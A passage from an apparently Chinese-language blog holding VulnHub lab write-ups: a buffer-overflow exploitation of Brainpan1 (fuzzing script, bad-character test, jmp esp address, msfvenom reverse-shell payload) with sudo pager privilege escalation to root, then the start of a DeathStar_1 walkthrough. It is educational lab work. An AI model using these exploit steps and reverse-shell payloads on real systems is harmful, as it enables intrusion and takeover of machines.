\x20\x20\x20\x20\x20\x20\x20\x20\x2<br>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20<br>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x<br>SF:20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x2<br>SF:0_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x2<br>SF:0THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\x<br>SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br>SF:x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20&quot;);<br>MAC Address: 00:0C:29:86:CE:1D (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose<br>Running: Linux 2.6.X|3.X<br>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3<br>OS details: Linux 2.6.32 - 3.10<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 41.15 seconds<br><br></code></pre></td></tr></table></figure><h5 id="vlum-扫描"><a href="#vlum-扫描" class="headerlink" title="vlum 扫描"></a>vlum 扫描</h5><p>Nmap 的漏洞扫描将针对目标运行该工具的默认漏洞扫描脚本。这些对于查找可利用的常见漏洞非常有用。</p><p><img src="/../img/vulnhub-Brainpan1.md/4.png"></p><h3 id="10000-端口"><a href="#10000-端口" class="headerlink" title="10000 端口"></a>10000 端口</h3><p>浏览器访问：192.168.17.144：10000</p><p><img src="/../img/vulnhub-Brainpan1.md/5.png"></p><h4 id="目录爆破："><a href="#目录爆破：" class="headerlink" title="目录爆破："></a>目录爆破：</h4><p>wfuzz 工具</p><p><img src="/../img/vulnhub-Brainpan1.md/6.png"></p><p>进入 bin 目录下</p><p><img src="/../img/vulnhub-Brainpan1.md/7.png"></p><p>下载到本地</p><p><img src="/../img/vulnhub-Brainpan1.md/8.png"></p><p><img src="/../img/vulnhub-Brainpan1.md/9.png"></p><h3 id="9999-端口"><a href="#9999-端口" class="headerlink" title="9999 端口"></a>9999 端口</h3><p><img src="/../img/vulnhub-Brainpan1.md/10.png"></p><p>nc 尝试：</p><p><img src="/../img/vulnhub-Brainpan1.md/11.png"></p><p>有可以输入的地方，但是还不知道如何利用</p><h3 id="brainpan-exe"><a href="#brainpan-exe" class="headerlink" title="brainpan.exe"></a>brainpan.exe</h3><p>win10 虚拟机运行后，kali 连接</p><p><img src="/../img/vulnhub-Brainpan1.md/12.png"></p><p><img src="/../img/vulnhub-Brainpan1.md/13.png"></p><p><strong>根据这个提示，copied * to buffer，猜测，是否有缓冲区溢出漏洞？</strong></p><p><strong><font style="color:rgb(51, 51, 51);">确定溢出大小 -&gt; 控制 eip</font></strong></p><p><strong><font style="color:rgb(51, 51, 51);">-&gt; 寻找 jmp esp -&gt; 测试坏字符</font></strong></p><p><strong><font style="color:rgb(51, 51, 51);">-&gt; 生成shellcode -&gt; 添加适量的nop</font></strong></p><p><strong><font style="color:rgb(51, 51, 51);">-&gt; 开始攻击</font></strong></p><p>139 个字符都不溢出</p><p><img src="/../img/vulnhub-Brainpan1.md/14.png"></p><h4 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h4><p>写一个自动测试溢出的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><br>size = <span class="hljs-number">100</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[+] Send evil buffer %s bytes&quot;</span> % size <br>        buffer = <span class="hljs-string">&#x27;A&#x27;</span> * size<br>        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>        s.connect((<span class="hljs-string">&quot;192.168.17.144&quot;</span>,<span class="hljs-number">9999</span>))<br>        s.send(buffer)<br>        s.close()<br><br>        size += <span class="hljs-number">100</span><br>        time.sleep(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[+] Could not connect.&quot;</span>)<br>        sys.exit()<br><br><br><br><br></code></pre></td></tr></table></figure><p>成功运行脚本，最多能发 700 字节</p><p><img src="/../img/vulnhub-Brainpan1.md/15.png"></p><h4 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h4><p><img src="/../img/vulnhub-Brainpan1.md/17.png"></p><p>注意 <strong>EIP</strong> 的地址：35724134（EIP 始终指向当前正在执行的指令之后的那条指令的内存地址。CPU 根据 EIP 的值从内存中读取指令并执行，执行完毕后 EIP 会自动递增（或根据跳转指令修改）以指向下一条指令。）</p><p><img src="/../img/vulnhub-Brainpan1.md/18.png"></p><p><img src="/../img/vulnhub-Brainpan1.md/19.png"></p><p>精确的匹配在 524 这个位置上（A 储存在 EDX 寄存器中）</p><p>重新构造 exp</p><p><img src="/../img/vulnhub-Brainpan1.md/20.png"></p><p>发送 exp，查看寄存器信息</p><p><img src="/../img/vulnhub-Brainpan1.md/21.png"></p><p>说明找到的 eip 是正确的（利用的话，在 eip 之后就可以存放 shellcode，把我们的反弹信息放i进去）</p><p>目前 C 仅有 72 字节，正常 payload 的大小为** 350-400 字节**</p><p>那么如何利用呢？</p><h4 id="扩容-esp"><a href="#扩容-esp" class="headerlink" title="扩容 esp"></a>扩容 esp</h4><p>修改 exp 中 C 的大小为 500，发送 exp</p><p>接受之后，在栈中查看 esp 的大小（0x005FFAE4-0x005FF910 &#x3D; 0x1D4）468 个字节</p><p><img src="/../img/vulnhub-Brainpan1.md/22.png"></p><p><img src="/../img/vulnhub-Brainpan1.md/23.png"></p><p><img src="/../img/vulnhub-Brainpan1.md/24.png"></p><p>468 字节！</p><p>大小合适！</p><p>说明 esp 的空间可以为我所用！</p><h5 id="验证-esp-中有哪些坏字符"><a href="#验证-esp-中有哪些坏字符" class="headerlink" title="验证 esp 中有哪些坏字符"></a>验证 esp 中有哪些坏字符</h5><p>（c 语言程序中 0x00 默认就是坏字节）</p><p>GitHub：badchars</p><p><img src="/../img/vulnhub-Brainpan1.md/25.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plain">┌──(kali㉿kali)-[~/VulnHub/Brainpan1/badchars]<br>└─$ ./badchars -f ruby<br>badchars = (<br>  &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot; +<br>  &quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot; +<br>  &quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot; +<br>  &quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot; +<br>  &quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot; +<br>  &quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot; +<br>  &quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot; +<br>  &quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot; +<br>  &quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot; +<br>  &quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot; +<br>  &quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot; +<br>  &quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot; +<br>  &quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot; +<br>  &quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot; +<br>  &quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot; +<br>  &quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;<br>)<br><br><br><br></code></pre></td></tr></table></figure><p>修改 exp</p><p><img src="/../img/vulnhub-Brainpan1.md/26.png"></p><p>发送 exp，查看 esp 内存中的值</p><p><img src="/../img/vulnhub-Brainpan1.md/27.png"></p><p>可以看到 01-FF 都在内存中连续，正确的展示出来了，说明该程序中<strong>没有坏字节</strong></p><p>若内存中本该出现 01-FF 的内存中出现了 00 或者间断的字节内容，就说明存在坏字节</p><h4 id="构造-EIP-指向-ESP"><a href="#构造-EIP-指向-ESP" class="headerlink" title="构造 EIP 指向 ESP"></a>构造 EIP 指向 ESP</h4><p>每次 esp 的地址是不固定的，那么我们需要使用 EIP 来指向一个 esp 的地址</p><p>拿到 jmp esp 的操作码</p><p><img src="/../img/vulnhub-Brainpan1.md/28.png"></p><h5 id="Immunity-Debugger-mona-py"><a href="#Immunity-Debugger-mona-py" class="headerlink" title="Immunity Debugger -&gt;mona.py"></a><font style="color:rgb(51, 51, 51);">Immunity Debugger -&gt;</font>mona.py</h5><p>无 rebase 无 safeSEH 无 ASLR 无 CFG 无 NX 无 OS Dll</p><p><img src="/../img/vulnhub-Brainpan1.md/29.png"></p><p>通过字节码在 exe 找 jmp esp 的地址</p><p><img src="/../img/vulnhub-Brainpan1.md/30.png"></p><p>地址：0x311712f3       “\xff\xe4”（jmp 的字节码）</p><h6 id="构造-EIP-的内容："><a href="#构造-EIP-的内容：" class="headerlink" title="构造 EIP 的内容："></a>构造 EIP 的内容：</h6><p>在 exp 中的 EIP 位置，构造0x311712f3 地址，小端序–&gt;”\xf3\x12\x17\x31”</p><p><img src="/../img/vulnhub-Brainpan1.md/31.png"></p><h4 id="构造-ESP-的-shellcode"><a href="#构造-ESP-的-shellcode" class="headerlink" title="构造 ESP 的 shellcode"></a>构造 ESP 的 shellcode</h4><p>Msfvenom（教程：<a href="https://blog.csdn.net/qq_48985780/article/details/121441548">https://blog.csdn.net/qq_48985780&#x2F;article&#x2F;details&#x2F;121441548</a>）</p><p>-p 指定要使用的 payload</p><p>-b 设定坏字节</p><p>-e 指定编码器：shikata_ga_nai（绕过和免杀效果好。）</p><p>-f c 指定输出格式为 c 代码</p><p>LHOST 要写 kali 的 ip 地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">┌──(kali㉿kali)-[~/VulnHub/Brainpan1]<br>└─$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.169.17.136 LPORT=443 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f c<br><br></code></pre></td></tr></table></figure><p>构造 exp：</p><p><img src="/../img/vulnhub-Brainpan1.md/32.png"></p><p>最终 exp</p><p><img src="/../img/vulnhub-Brainpan1.md/33.png"></p><h3 id="windows-获取反弹-shell"><a href="#windows-获取反弹-shell" class="headerlink" title="windows 获取反弹 shell"></a>windows 获取反弹 shell</h3><p>kali：sudo nc -lvnp 443 开启监听</p><p>windows：运行 brainpan.exe 程序</p><p>kali：发送 exp</p><p>成功 getshell！</p><p><img src="/../img/vulnhub-Brainpan1.md/34.png"></p><h2 id="brainpan-ova"><a href="#brainpan-ova" class="headerlink" title="brainpan.ova"></a>brainpan.ova</h2><p>linux 系统</p><p>ip：192.168.17.144</p><p>生成 linux 的 payload（这个程序运行之后是通过 9999 端口交互的，并且基于内存的利用都是通用的，可以忽略操作系统的概念，还有别的巴拉巴拉….）</p><p><img src="/../img/vulnhub-Brainpan1.md/35.png"></p><p>针对靶机的 exp：</p><p><img src="/../img/vulnhub-Brainpan1.md/36.png"></p><h3 id="成功反弹-shell（低权限）！"><a href="#成功反弹-shell（低权限）！" class="headerlink" title="成功反弹 shell（低权限）！"></a>成功反弹 shell（低权限）！</h3><p><img src="/../img/vulnhub-Brainpan1.md/37.png"></p><p>美化 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;<br></code></pre></td></tr></table></figure><p><img src="/../img/vulnhub-Brainpan1.md/38.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br><br>puck@brainpan:/home/puck$ sudo -l<br>sudo -l<br>Matching Defaults entries for puck on this host:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User puck may run the following commands on this host:<br>    (root) NOPASSWD: /home/anansi/bin/anansi_util<br>    <br>puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util<br>sudo /home/anansi/bin/anansi_util<br>Usage: /home/anansi/bin/anansi_util [action]<br>Where [action] is one of:<br>  - network<br>  - proclist<br>  - manual [command]<br><br><br>puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual ls    <br>sudo /home/anansi/bin/anansi_util manual ls<br>No manual entry for manual<br>WARNING: terminal is not fully functional<br>-  (press RETURN)<br>LS(1)                            User Commands                           LS(1)<br><br>NAME<br>       ls - list directory contents<br><br>SYNOPSIS<br>       ls [OPTION]... [FILE]...<br><br>DESCRIPTION<br>       List  information  about  the FILEs (the current directory by default).<br>       Sort entries alphabetically if none of -cftuvSUX nor --sort  is  speci‐<br>       fied.<br><br>       Mandatory  arguments  to  long  options are mandatory for short options<br>       too.<br><br>       -a, --all<br>              do not ignore entries starting with .<br><br>       -A, --almost-all<br>              do not list implied . and ..<br><br>       --author<br> Manual page ls(1) line 1 (press h for help or q to quit)!/bin/bash<br>!/bin/bash（经验！！！）<br><br>root@brainpan:/usr/share/man# <br><br>root@brainpan:/home/puck/web# ip -a<br>ip -a<br>Option &quot;-a&quot; is unknown, try &quot;ip -help&quot;.<br>root@brainpan:/home/puck/web# uname -a<br>uname -a<br>Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux<br>root@brainpan:/home/puck/web# <br><br><br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vulnhub靶场</tag>
      
      <tag>缓冲区溢出（构造 eip 指向 esp、 esp 构造 shellcode）</tag>
      
      <tag>vlum-nmap漏洞探测</tag>
      
      <tag>wfuzz目录爆破</tag>
      
      <tag>msf-pattern</tag>
      
      <tag>badchars坏字节</tag>
      
      <tag>Immunity Debugger -&gt;mona.py</tag>
      
      <tag>Msfvenom构造shellcode!/bin/bash（提权）</tag>
      
      <tag>ret2libc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub:deathstar_1</title>
    <link href="/2025/05/29/vulnhub-deathstar_1/"/>
    <url>/2025/05/29/vulnhub-deathstar_1/</url>
    
    <content type="html"><![CDATA[<p>网址：<a href="https://www.vulnhub.com/entry/death-star-1,477/">https://www.vulnhub.com/entry/death-star-1,477/</a></p><h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><h4 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h4><p><img src="/../img/vulnhub-deathstar_1.md/1.png"></p><p>解压压缩包。</p><p><img src="/../img/vulnhub-deathstar_1.md/2.png"></p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>在 Vmware 左上角“文件”–&gt;“打开”–&gt;选择“DeathStart_1.ovf”即可</p><p>启动虚拟机</p><p><img src="/../img/vulnhub-deathstar_1.md/3.png"></p><h1 id="攻入"><a href="#攻入" class="headerlink" title="攻入"></a>攻入</h1><h2 id="nmap-探测开放端口"><a href="#nmap-探测开放端口" class="headerlink" title="nmap 探测开放端口"></a>nmap 探测开放端口</h2><p>打开 kali，nmap 扫描网段，找到靶机 ip：192.168.17.254</p><p><img src="/../img/vulnhub-deathstar_1.md/4.png"></p><p>可以联通靶机</p><p><img src="/../img/vulnhub-deathstar_1.md/5.png"></p><p><strong>全端口扫描</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/6.png"></p><p>没有结果….</p><p><strong>添加-f 参数进行数据包分片</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/7.png"></p><p>没有结果….</p><p><strong>源端口伪装</strong></p><p>将源端口伪装成 dns</p><p><img src="/../img/vulnhub-deathstar_1.md/8.png"></p><p>没有结果….</p><p><strong>按顺序扫描（nmap 默认是随机扫描）</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/9.png"></p><p>没有结果….</p><p><strong>修改 TCP 标志</strong></p><p>猜测防火墙仅过滤特定的 syn 扫描，若使用 urg、psh、fin 这三个标志进行发送可能不过滤</p><p><img src="/../img/vulnhub-deathstar_1.md/10.png"></p><p>没有结果….</p><p><strong>测试 UDP</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/11.png"></p><p>仅开放&#x2F;过滤 dhcp，没什么用</p><p>至此 nmap 探测没有什么效果，尝试使用抓取网络流量</p><h2 id="网络流量抓取"><a href="#网络流量抓取" class="headerlink" title="网络流量抓取"></a>网络流量抓取</h2><p>查看网卡</p><p><img src="/../img/vulnhub-deathstar_1.md/12.png"></p><p>使用 tshark（tshark 就是 wires hark 的命令行版本）</p><p><img src="/../img/vulnhub-deathstar_1.md/13.png"></p><p><em><strong>发现：靶机每 60s 向外发送一次数据包</strong></em></p><p>__</p><p>查看截获的数据包：</p><p><img src="/../img/vulnhub-deathstar_1.md/14.png"></p><p>观察到数据包中的 ASCII 码，尝试提取</p><p><img src="/../img/vulnhub-deathstar_1.md/15.png"></p><p><img src="/../img/vulnhub-deathstar_1.md/16.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>xxd常用于调试、文件内容分析和数据转换，用来把文件或标准输入的文件转化成16进制或者二进制（－d参数）<br>-r：将十六进制数据还原为二进制（反向操作）。<br>-p：以连续的纯十六进制形式（不带偏移地址和 ASCII）输出。<br>-c cols：每行输出多少个字节，默认为 16。<br>-g bytes：每组显示多少字节，默认为 2。<br>-s offset：从文件的某个偏移位置开始读取（支持负数表示从文件末尾开始）。<br>-l length：只显示指定长度的字节。<br>-u：将输出的十六进制字符转为大写。<br>-i：以 C 语言的数组格式输出。<br>-b：将输出转换为二进制格式，而不是十六进制。<br></code></pre></td></tr></table></figure><p>将数据包中的 ASCII 提取，转译，得到以下提示内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>Code to access the Death Star Blueprint<br>within the time it takes to reload is:  DS-1@OBS     <br><br><br>Thanks to the successful Operation Skyhook, the Rebel Alliance<br>got some plans for the new weapon of the Galactic Empire. We<br>know that there is a small opening that we can explore through a<br>thermal exhaust that is directly connected to the Main Reactor of the<br>Death Star. The superlaser takes 1440 minutes to reload.<br>It is very important to observe &#x27;this window&#x27; in order to recover the blueprint.<br>This is because, it is only possible to make an attempt every 60 seconds.<br><br>翻译：<br>访问死星蓝图的代码（需在重新装填时间内输入）：DS-1@OBS<br><br>得益于&quot;天钩行动&quot;的成功，义军同盟获得了银河帝国新式武器的部分设计图。我们已发现一个可通过热排气口进入的小型通道，该通道直通死星的主反应堆。超级激光炮需要1440分钟重新装填。<br>必须密切把握&quot;这个窗口期&quot;才能获取蓝图。<br>因为系统每60秒才允许尝试一次。<br></code></pre></td></tr></table></figure><h4 id="锁定-1440-端口"><a href="#锁定-1440-端口" class="headerlink" title="锁定 1440 端口"></a>锁定 1440 端口</h4><p>提示中提到了 1440 和 60，这俩可能是俩开放的端口，nmap 扫描</p><p><img src="/../img/vulnhub-deathstar_1.md/17.png"></p><p>nmap 成功扫描到了 1440 开放端口</p><h4 id="nc-连接"><a href="#nc-连接" class="headerlink" title="nc 连接"></a>nc 连接</h4><p><img src="/../img/vulnhub-deathstar_1.md/18.png"></p><p><strong>想到提示</strong>：访问死星蓝图的代码（需在重新装填时间内输入）：DS-1@OBS</p><p>echo “DS-1@OBS” | nc -u 192.168.17.143 1440 | tee mass</p><p><img src="/../img/vulnhub-deathstar_1.md/19.png"></p><h4 id="对-mass-分析"><a href="#对-mass-分析" class="headerlink" title="对 mass 分析"></a>对 mass 分析</h4><p>看起来像 base64 </p><p><img src="/../img/vulnhub-deathstar_1.md/20.png"></p><p>打开图像（open x）</p><p><img src="/../img/vulnhub-deathstar_1.md/21.png"></p><h2 id="对-Blueprint-图进行分析"><a href="#对-Blueprint-图进行分析" class="headerlink" title="对 Blueprint 图进行分析"></a>对 Blueprint 图进行分析</h2><h4 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h4><p>steghide（一款强大的隐写术工具<a href="https://labex.io/zh/tutorials/hide-data-in-steghide-549941">https://labex.io/zh/tutorials/hide-data-in-steghide-549941</a>）</p><p><img src="/../img/vulnhub-deathstar_1.md/22.png"></p><p><strong>解锁码的每个分段必须由3个字符组成，按顺序发送方可开启10110端口。</strong></p><h2 id="端口敲门"><a href="#端口敲门" class="headerlink" title="端口敲门"></a>端口敲门</h2><p>nmap 查看 10110 端口的状态</p><p><img src="/../img/vulnhub-deathstar_1.md/23.png"></p><p>过滤态</p><h4 id="knock"><a href="#knock" class="headerlink" title="knock"></a>knock</h4><p><img src="/../img/vulnhub-deathstar_1.md/24.png"></p><p>查看 10110 端口的服务信息</p><p><img src="/../img/vulnhub-deathstar_1.md/25.png"></p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p><img src="/../img/vulnhub-deathstar_1.md/26.png"></p><p>问 ChatGpt，得到密码：lyra13</p><p><img src="/../img/vulnhub-deathstar_1.md/27.png"></p><p>有提示：</p><p><img src="/../img/vulnhub-deathstar_1.md/28.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>来自盖伦·厄索的讯息：<br><br>这是你的机会。摧毁银河帝国的计划。我知道维达勋爵绝不会乐见此事。但，这将是我赎罪的机会。希望你们掌握足够的知识来协助摧毁这件新武器。<br><br>探索系统并获取&quot;root权限&quot;，读取位于&quot;/root/message.txt&quot;的秘密信息。<br><br>不成功便成仁！！<br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>列出系统中所有设置了 SUID 或 SGID 权限的可执行文件。</p><p><img src="/../img/vulnhub-deathstar_1.md/29.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/34357387/1748500125418-ac5135ae-cd2c-45bb-8bde-167776b2ca31.png"></p><h4 id="dartVader-分析"><a href="#dartVader-分析" class="headerlink" title="dartVader 分析"></a>dartVader 分析</h4><p>查看&#x2F;bin&#x2F;dartVader</p><p><img src="/../img/vulnhub-deathstar_1.md/30.png"></p><p><img src="/../img/vulnhub-deathstar_1.md/31.png"></p><p>提示：dartVader: 你在这里有未来。别当个菜鸟，去真正寻找并学习…</p><p><img src="/../img/vulnhub-deathstar_1.md/32.png"></p><p>查看包含字符串：</p><p><img src="/../img/vulnhub-deathstar_1.md/33.png"></p><p>该文件是一个 elf 文件，将文件提取到 kali</p><p>scp -P 10110 <a href="mailto:&#101;&#x72;&#x73;&#111;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#49;&#x37;&#x2e;&#x31;&#x34;&#51;">erso@192.168.17.143</a>:&#x2F;bin&#x2F;dartVader .</p><p>使用 kali 中 gdb 和 gdb-peda</p><p><img src="/../img/vulnhub-deathstar_1.md/34.png"></p><p><strong>开启了 NX 保护</strong>(checksec 讲解：<a href="https://bbs.kanxue.com/thread-250538.htm">https://bbs.kanxue.com/thread-250538.htm</a>)</p><p>反汇编 main 函数：</p><p><img src="/../img/vulnhub-deathstar_1.md/35.png"></p><p><strong>发现使用了不安全的反汇编函数 strcpy，而且没有验证长度！</strong></p><h4 id="测试是否存在缓冲区溢出漏洞"><a href="#测试是否存在缓冲区溢出漏洞" class="headerlink" title="测试是否存在缓冲区溢出漏洞"></a>测试是否存在缓冲区溢出漏洞</h4><p><img src="/../img/vulnhub-deathstar_1.md/36.png"></p><p>没有输出</p><p>搜索靶机是否有 python 环境</p><p><img src="/../img/vulnhub-deathstar_1.md/37.png"></p><p>当命令行输入 100 个 A 时候，触发报错：</p><p><img src="/../img/vulnhub-deathstar_1.md/38.png"></p><p>查看日志</p><p><img src="/../img/vulnhub-deathstar_1.md/39.png"></p><p>确定 sp 寄存器的地址：bff03670</p><p><strong>根据 41414141 确定存在缓冲区溢出漏洞</strong></p><hr><p><strong>readelf 查看文件详情（scanelf -e dartVader 也可以）</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/40.png"></p><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p><img src="/../img/vulnhub-deathstar_1.md/41.png"></p><h5 id="ASLR"><a 